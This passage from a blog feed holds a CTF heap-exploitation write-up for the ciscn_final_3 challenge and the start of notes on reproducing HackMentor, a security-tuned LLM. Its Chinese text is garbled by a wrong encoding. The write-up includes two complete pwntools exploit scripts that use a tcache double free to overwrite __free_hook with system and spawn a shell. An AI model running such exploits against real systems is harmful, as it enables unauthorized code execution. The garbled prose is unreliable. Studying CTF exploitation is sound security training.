freeå¯ä»¥åœ¨ä»»æ„åœ°å€åˆ†é…chunkçš„åŸç†ï¼Œåœ¨æŸä¸ªchunkå‡16çš„ä½ç½®åˆ†é…chunkï¼Œæ–°çš„chunkå°±å¯ä»¥ä¿®æ”¹æ—§çš„chunkçš„szå­—æ®µï¼Œè®©ä»–å¯ä»¥è¢«freeåˆ° unsorted bin ã€‚</p><p>æ²¡æœ‰showå‡½æ•°ï¼Œå¦‚ä½•æ³„éœ²unsorted binçš„åœ°å€ï¼Ÿ</p><blockquote><p>åˆ‡å‰²unsorted biné‡Œçš„chunkï¼Œä½¿è¿™ä¸ªchunkå’Œä¸€ä¸ª<strong>å·²ç»è¢«free</strong>çš„tcache chunkå¼€å¤´å¯¹é½ï¼Œè¿™æ—¶å°±ç›¸å½“äºä¿®æ”¹äº†tcache chunkçš„fdï¼Œfd= &amp; unsorted binï¼Œ</p><p>è¿ç»­åˆ†é…ä¸¤æ¬¡chunkï¼Œå°±å¯ä»¥åœ¨unsorted binå¤„åˆ†é…ä¸€ä¸ªchunkï¼Œ é¢˜ç›®è‡ªå¸¦æ³„éœ²chunkåœ°å€çš„åŠŸèƒ½ï¼Œå°±ç­‰äºæ³„éœ²äº†libc</p></blockquote><p>å†æ¥ä¸€ä¸ªtcache double freeï¼Œå‘free hookå†™å…¥systemï¼Œç„¶åfreeä¸€ä¸ªcontent=binshçš„chunkï¼Œå°±å®Œäº‹äº†</p><p><strong>å¦‚ä½•æƒ³åˆ°çš„å‘¢ï¼Ÿ</strong></p><p>é¢˜ç›®åªæœ‰newå’Œdeleteï¼Œä»¥åŠæ³„éœ²chunkåœ°å€ã€‚æƒ³è¦æ³„éœ²libcå°±å¿…é¡»é€šè¿‡è¿™ä¸ªè‡ªå¸¦çš„æ³„éœ²å®ç°ã€‚å› æ­¤è¦åœ¨unsorted binè¿™ä¸ªåœ°æ–¹mallocä¸€ä¸ªchunkï¼ˆæ¯•ç«Ÿæˆ‘åªä¼šé€šè¿‡unsorted binæ³„éœ²libcåœ°å€ï¼‰ï¼Œç»“åˆé¢˜ç›®æœ€å¤§chunkä¸è¶…è¿‡0x78çš„é™åˆ¶ï¼Œå¾—åˆ°å¿…é¡»è¦æ”¹æŸä¸ªchunkçš„szå­—æ®µçš„ç»“è®ºã€‚</p><p>ç„¶åæ²¡æœ‰editï¼Œåªæœ‰newçš„æ—¶å€™èƒ½ä¿®æ”¹ï¼Œå› æ­¤è¦åˆ©ç”¨â€œå‘ä»»æ„åœ°å€åˆ†é…chunkâ€çš„æ¼æ´ï¼Œç„¶åä¸€çœ‹ï¼Œæ­£å¥½å¯ä»¥ç”¨double freeï¼Œå¯¹ä¸Šäº†ã€‚</p><p>è‡³äºchunkè¢«freeåˆ°unsorted binä¹‹åå¦‚ä½•æ³„éœ²fdï¼Œbkï¼Œè¿™ç¡®å®å¾ˆéš¾æƒ³åˆ°ã€‚â€œåˆ‡å‰²unsorted binæŠŠå®ƒçš„å¼€å¤´å’Œä¸€ä¸ªfreeçš„tcache chunkå¯¹é½â€ è¿™ä¸€ç‚¹ä¹Ÿåªæœ‰è¿™é“é¢˜èƒ½ç”¨äº†ï¼Œæ¯•ç«Ÿéœ€è¦æœ‰çŸ¥é“chunkè¢«åˆ†é…åˆ°å“ªé‡Œçš„èƒ½åŠ›ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;DEBUG&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28198</span>)<br>e = ELF(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>) <br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;choice &gt; &#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the index\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index, size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice &gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the index\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;input the size\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&#x27;now you can write something\n&#x27;</span>)<br>    p.sendline(content)<br>    p.recvuntil(<span class="hljs-string">b&#x27;gift :&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>])<br><br>addr0 = new(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">1</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">2</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">3</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>new(<span class="hljs-number">5</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">6</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>new(<span class="hljs-number">8</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment"># from 0 - 8 -&gt; sz= 0x450</span><br>new(<span class="hljs-number">9</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <br>new(<span class="hljs-number">10</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br><br>delete(<span class="hljs-number">10</span>)<br>delete(<span class="hljs-number">10</span>)<br>new(<span class="hljs-number">11</span>, <span class="hljs-number">0x70</span>, p64(addr0 - <span class="hljs-number">16</span>))<br>new(<span class="hljs-number">12</span>, <span class="hljs-number">0x70</span>, p64(addr0 - <span class="hljs-number">16</span>))<br>new(<span class="hljs-number">13</span>, <span class="hljs-number">0x70</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x451</span>)) <span class="hljs-comment"># size must be equal to the front </span><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">14</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) <span class="hljs-comment"># cut unsorted bin chunk</span><br>new(<span class="hljs-number">15</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>main_arena = new(<span class="hljs-number">16</span>, <span class="hljs-number">0x40</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>) - <span class="hljs-number">96</span><br>libc_base = main_arena-<span class="hljs-number">0x10</span>-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system_addr = libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook = libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>new(<span class="hljs-number">17</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;aaa&#x27;</span>)<br>delete(<span class="hljs-number">17</span>)<br>delete(<span class="hljs-number">17</span>)<br>new(<span class="hljs-number">18</span>, <span class="hljs-number">0x10</span>, p64(free_hook))<br>new(<span class="hljs-number">19</span>, <span class="hljs-number">0x10</span>, p64(free_hook))<br>new(<span class="hljs-number">20</span>, <span class="hljs-number">0x10</span>, p64(system_addr))<br>delete(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸ªåœ°æ–¹æ²¡æƒ³æ˜ç™½ï¼Œä¸ºä»€ä¹ˆé¢˜ç›®é‡Œè¿™ä¸ª0x40ï¼Œæ”¹æˆ0x50ä¹Ÿå¯¹ï¼ˆåŒæ—¶ä¹Ÿä¿®æ”¹0x461ï¼‰ï¼Œæ”¹æˆ0x70ï¼ˆåŒæ—¶ä¹Ÿä¿®æ”¹0x481ï¼‰å°±ä¸å¯¹äº†ã€‚ã€‚ã€‚æƒ³ä¸æ˜ç™½äº† ğŸ˜­</p><h2 id="tcache-stash"><a href="#tcache-stash" class="headerlink" title="tcache stash"></a>tcache stash</h2><p>æ¯”å¦‚å½“ä¸€ä¸ªçº¿ç¨‹ç”³è¯·0x50å¤§å°çš„chunkæ—¶ï¼Œå¦‚æœtcacheæ²¡æœ‰ï¼Œé‚£ä¹ˆå°±ä¼šè¿›å…¥åˆ†é…åŒºè¿›è¡Œå¤„ç†ï¼Œå¦‚æœå¯¹åº”binä¸­å­˜åœ¨0x50çš„chunkï¼Œé™¤äº†å–å‡ºå¹¶è¿”å›ä¹‹å¤–ï¼Œptmallocä¼šè®¤ä¸ºè¿™ä¸ªçº¿ç¨‹åœ¨å°†æ¥è¿˜éœ€è¦ç›¸åŒçš„å¤§å°çš„chunkï¼Œå› æ­¤å°±ä¼šæŠŠå¯¹åº”binä¸­0x50çš„chunkå°½å¯èƒ½çš„æ”¾å…¥tcacheçš„å¯¹åº”é“¾è¡¨ä¸­å»ã€‚</p><h3 id="ciscn-final-3-1"><a href="#ciscn-final-3-1" class="headerlink" title="ciscn_final_3"></a>ciscn_final_3</h3><p>è¿˜æ˜¯ä¸Šä¸€èŠ‚è¿™é“é¢˜ï¼Œä¸ç”¨tcache è¿ç»­double freeæ— æ£€æŸ¥çš„æ¼æ´ã€‚</p><p>æŠ„çš„å¤§ä½¬çš„åšå®¢ï¼š<a href="https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3">https://arttnba3.cn/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/#%E4%BE%8B%E9%A2%982%EF%BC%88fastbin-double-free%EF%BC%89%EF%BC%9Aciscn-2019-final-3</a></p><p>ä½†æ˜¯æœ€åé¢pwndbgæ˜¾ç¤ºä¸å‡ºæ¥å †ï¼Œexpæ²¡çœ‹æ‡‚ï¼ˆ</p><p>ä»¥åå†è¯´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 28849) </span><br>p = process(<span class="hljs-string">&#x27;./ciscn_final_3&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;) </span><br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<span class="hljs-comment">#</span><br><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">choice:<span class="hljs-built_in">int</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;choice &gt; &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span>,size:<span class="hljs-built_in">int</span> , content</span>):<br>    cmd(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input the index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;input the size&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;now you can write something&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index:<span class="hljs-built_in">int</span></span>):<br>    cmd(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;input the index&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    new(<span class="hljs-number">0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <br>    p.recvuntil(<span class="hljs-string">b&quot;gift :&quot;</span>)<br>    heap_leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-string">&#x27;heap addr leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    heap_base = heap_leak - <span class="hljs-number">0x11e70</span> <span class="hljs-comment"># tcache struct &#x27;s header</span><br>    log.success(<span class="hljs-string">&#x27;heap base: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base)) <span class="hljs-comment"># leak 0</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>        new(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>): <span class="hljs-comment"># 0~6 free tcache is full</span><br>        free(i)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    free(<span class="hljs-number">7</span>) <span class="hljs-comment">#  free(x) to tcache then free(x) to fastbin can&#x27;t trigger error</span><br>    free(<span class="hljs-number">8</span>)<br>    free(<span class="hljs-number">7</span>) <span class="hljs-comment"># fastbin double free </span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>,<span class="hljs-number">17</span>): <br>        new(i, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># 10 ~ 16 == 0 ~ 6</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">17</span>, <span class="hljs-number">0x70</span>, p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment"># stash , fastbin to tcache</span><br>    <span class="hljs-comment"># gdb.attach(p)</span><br>    new(<span class="hljs-number">18</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">19</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">20</span>, <span class="hljs-number">0x70</span>, (<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">35</span> + <span class="hljs-string">b&#x27;\x07&#x27;</span> * <span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(heap_base + <span class="hljs-number">0x10</span>) * <span class="hljs-number">6</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment"># change 36th to 7 (36th is 0x250, the size of tcache struct)</span><br>    <span class="hljs-comment"># and change tcache_entry *entries[0~6] which ranges from 0x20 to 0x70</span><br>    free(<span class="hljs-number">20</span>) <span class="hljs-comment"># to unsorted bin</span><br>    gdb.attach(p)<br>    <span class="hljs-comment"># why tcache_entry changed ?</span><br>    new(<span class="hljs-number">21</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br>    new(<span class="hljs-number">22</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>) <span class="hljs-comment"># can&#x27;t pwndbg</span><br>    p.recvuntil(<span class="hljs-string">b&quot;gift :&quot;</span>)<br>    libc_leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop = <span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-string">&#x27;libc addr leak: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    libc_base = libc_leak - <span class="hljs-number">0x3ebca0</span><br>    log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    new(<span class="hljs-number">23</span>, <span class="hljs-number">0x50</span>, (<span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">10</span>).ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]) * <span class="hljs-number">2</span>)<br>    new(<span class="hljs-number">24</span>, <span class="hljs-number">0x10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>    free(<span class="hljs-number">10</span>)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMentorè®ºæ–‡å¤ç°</title>
    <link href="/2023/11/30/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0/HackMentor/"/>
    <url>/2023/11/30/%E8%AE%BA%E6%96%87%E5%A4%8D%E7%8E%B0/HackMentor/</url>
    
    <content type="html"><![CDATA[<h3 id="HackMentor"><a href="#HackMentor" class="headerlink" title="HackMentor"></a>HackMentor</h3><p>å®˜æ–¹ä»£ç åœ°å€ï¼š<a href="https://github.com/tmylla/HackMentor/tree/main">https://github.com/tmylla/HackMentor/tree/main</a></p><p>è®ºæ–‡ï¼š<a href="https://github.com/tmylla/HackMentor/blob/main/HackMentor.pdf">https://github.com/tmylla/HackMentor/blob/main/HackMentor.pdf</a></p><p>llmçš„ä¸€ä¸ªå¾®è°ƒï¼Œç”¨äºå®‰å…¨é¢†åŸŸçŸ¥è¯†é—®ç­”ï¼Œå¤ä¹ ä¸€ä¸‹pytorchå’Œlora</p><h4 id="åŠ è½½-base-model-å’Œ-lora-model"><a href="#åŠ è½½-base-model-å’Œ-lora-model" class="headerlink" title="åŠ è½½ base model å’Œ lora model"></a>åŠ è½½ base model å’Œ lora model</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> transformers, torch<br><span class="hljs-keyword">from</span> peft <span class="hljs-keyword">import</span> PeftModel<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_lora_model</span>(<span class="hljs-params">base_model, lora_model, device_map=<span class="hljs-string">&quot;auto&quot;</span></span>):<br>    <span class="hljs-keyword">global</span> model, tokenizer, generator<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Loading &quot;</span>+base_model+<span class="hljs-string">&quot;...&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> device_map == <span class="hljs-string">&quot;zero&quot;</span>:<br>        device_map = <span class="hljs-string">&quot;balanced_low_0&quot;</span><br><br>    <span class="hljs-comment"># config</span><br>    gpu_count = torch.cuda.device_count()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;gpu_count&#x27;</span>, gpu_count)<br><br>    tokenizer = transformers.LlamaTokenizer.from_pretrained(base_model)<br>    model = transformers.LlamaForCausalLM.from_pretrained(<br>        base_model,<br>        device_map=<span class="hljs-string">&quot;auto&quot;</span>,<br>        torch_dtype=torch.float16,<br>        low_cpu_mem_usage=<span class="hljs-literal">True</span>,<br>        load_in_8bit=<span class="hljs-literal">False</span>,<br>        cache_dir=<span class="hljs-string">&quot;cache&quot;</span><br>    ).cuda()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Loading &quot;</span>+lora_model+<span class="hljs-string">&quot;...&quot;</span>)<br>    model = PeftModel.from_pretrained(<br>        model,<br>        lora_model,<br>        torch_dtype=torch.float16<br>    )<br>    generator = model.generate<br></code></pre></td></tr></table></figure><h4 id="ä½¿ç”¨model"><a href="#ä½¿ç”¨model" class="headerlink" title="ä½¿ç”¨model"></a>ä½¿ç”¨model</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">fulltext = ......<br>generated_text = <span class="hljs-string">&quot;&quot;</span><br>gen_in = tokenizer(fulltext, return_tensors=<span class="hljs-string">&quot;pt&quot;</span>).input_ids.cuda()<br>in_tokens = <span class="hljs-built_in">len</span>(gen_in)<br><span class="hljs-keyword">with</span> torch.no_grad():<br>    generated_ids = generator(<br>        input_ids = gen_in,<br>        max_new_tokens=<span class="hljs-number">2048</span>,  <span class="hljs-comment"># ç”Ÿæˆç»“æœçš„é•¿åº¦ä¸Šé™</span><br>        use_cache=<span class="hljs-literal">True</span>,<br>        pad_token_id=tokenizer.eos_token_id, <span class="hljs-comment"># ç”¨äºæŒ‡ç¤ºæ–‡æœ¬ç»“æŸçš„æ ‡è®°</span><br>        num_return_sequences=<span class="hljs-number">1</span>, <span class="hljs-comment"># ç”Ÿæˆçš„æ–‡æœ¬åºåˆ—æ•°é‡</span><br>        do_sample=<span class="hljs-literal">True</span>,<br>        repetition_penalty=<span class="hljs-number">1.1</span>, <span class="hljs-comment"># æ§åˆ¶æ¨¡å‹ç”Ÿæˆé‡å¤æ ‡è®°çš„å€¾å‘æ€§ï¼Œæ•°å€¼è¶Šå¤§ï¼Œç”Ÿæˆçš„æ–‡æœ¬ä¸­é‡å¤æ€§è¶Šä½</span><br>        temperature=<span class="hljs-number">0.6</span>, <span class="hljs-comment"># ç”¨äºæ§åˆ¶ç”Ÿæˆçš„å¤šæ ·æ€§ã€‚è¾ƒé«˜çš„æ¸©åº¦ä¼šå¢åŠ æ ‡è®°çš„éšæœºæ€§</span><br>        top_k = <span class="hljs-number">50</span>, <span class="hljs-comment"># åœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­ï¼Œåªæœ‰æ¦‚ç‡æ’ååœ¨å‰Kä½çš„æ ‡è®°æ‰ä¼šè¢«è€ƒè™‘</span><br>        top_p = <span class="hljs-number">1.0</span>, <span class="hljs-comment"># åœ¨ç”Ÿæˆè¿‡ç¨‹ä¸­ï¼Œç´¯ç§¯æ¦‚ç‡è¾¾åˆ°ç»™å®šå€¼pæ—¶åœæ­¢è€ƒè™‘æ›´ä½æ¦‚ç‡çš„æ ‡è®°</span><br>        early_stopping=<span class="hljs-literal">True</span>, <span class="hljs-comment"># ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œæ§åˆ¶ç”Ÿæˆè¿‡ç¨‹æ˜¯å¦åœ¨é‡åˆ°pad_token_idååœæ­¢</span><br>    )<br>    generated_text = tokenizer.batch_decode(generated_ids, skip_special_tokens=<span class="hljs-literal">True</span>)[<span class="hljs-number">0</span>] <br>    text_without_prompt = generated_text[<span class="hljs-built_in">len</span>(fulltext):]<br><br>response = text_without_prompt<br>response = response.split(human_invitation)[<span class="hljs-number">0</span>]<br>response.strip()<br></code></pre></td></tr></table></figure><h4 id="è®­ç»ƒ"><a href="#è®­ç»ƒ" class="headerlink" title="è®­ç»ƒ"></a>è®­ç»ƒ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 